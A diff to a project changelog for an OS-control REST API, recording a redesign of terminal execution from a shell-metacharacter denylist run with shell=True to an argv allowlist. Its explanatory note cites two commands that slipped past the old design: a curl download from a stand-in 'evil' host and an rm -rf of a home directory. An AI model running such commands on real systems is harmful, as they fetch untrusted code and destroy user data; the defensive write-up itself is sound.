@@ -207,13 +207,22 @@ Live smoke: `python scripts/live_linux_smoke.py` / `DISPLAY=:2 python scripts/li
 ## PR21: Terminal execute ALLOW|DENY|ADMIN
 - **Status:** DONE
 - **Files:**
-  - `windows_os_api/os/terminal/service.py`
-  - `windows_os_api/api/rest/services.py`
+  - `windows_os_api/os/terminal/allowlist.py` — command registry; commands run as
+    argv with `shell=False`, anything unregistered is refused
+  - `windows_os_api/os/terminal/service.py` — policy name validation, delegates
+  - `windows_os_api/backends/{linux,windows,fake}.py` — **enforcement point**
+  - `windows_os_api/api/rest/services.py` — `POST /v1/terminal/execute`
 - **Tests:**
+  - `tests/security/test_terminal_allowlist.py`
   - `tests/unit/test_fake_backend.py`
   - `tests/integration/test_api_os_layers.py`
   - `tests/security/test_security_hard.py`
-- **How to run:** `pytest tests/unit/test_fake_backend.py -q`
+- **How to run:** `pytest tests/security/test_terminal_allowlist.py -q`
+- **Note:** the previous design screened a raw string against a denylist of shell
+  metacharacters and then ran it with `shell=True`. Commands containing none of
+  those characters — `curl http://evil/x -o /tmp/x`, `rm -rf /home/user` — passed
+  and executed under the plain ALLOW policy. Blocking chaining was never the same
+  as blocking execution.
 
 ## PR22: Universal Adapter engine
 - **Status:** DONE
